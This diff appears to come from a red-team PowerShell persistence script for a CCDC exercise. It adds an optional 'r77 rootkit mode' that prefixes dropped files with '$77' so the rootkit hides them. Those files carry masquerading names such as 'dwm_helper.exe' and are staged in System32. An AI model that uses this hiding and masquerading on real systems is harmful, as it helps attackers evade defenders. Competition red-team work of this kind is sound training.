@@ -58,6 +58,15 @@ Write-Warn " CCDC Phase 3 — Persistence: Clockwork Chaos"
 Write-Warn "================================================================"
 Write-Host ""
 
+# ── r77 rootkit mode ──────────────────────────────────────────────────────────
+$r77Answer  = Read-Host "Is the r77 rootkit active? Prefix dropped files with `$77 to hide them? (y/N)"
+$HidePrefix = if ($r77Answer -match '^[Yy]') { '$77' } else { '' }
+if ($HidePrefix) {
+    Write-Warn "r77 mode ENABLED — dropped files will be prefixed: $HidePrefix"
+} else {
+    Write-Info "r77 mode: disabled"
+}
+
 # ── 0. Input validation ──────────────────────────────────────────────────────
 Write-Section "Input Validation"
 
@@ -129,8 +138,8 @@ $NamePool = @(
     "dwm_helper.exe"
 )
 
-$MaskedName1 = $NamePool[0]
-$MaskedName2 = $NamePool[1]
+$MaskedName1 = $HidePrefix + $NamePool[0]
+$MaskedName2 = $HidePrefix + $NamePool[1]
 $StagedPath1 = "$env:SystemRoot\System32\$MaskedName1"
 $StagedPath2 = "$env:SystemRoot\System32\$MaskedName2"
 
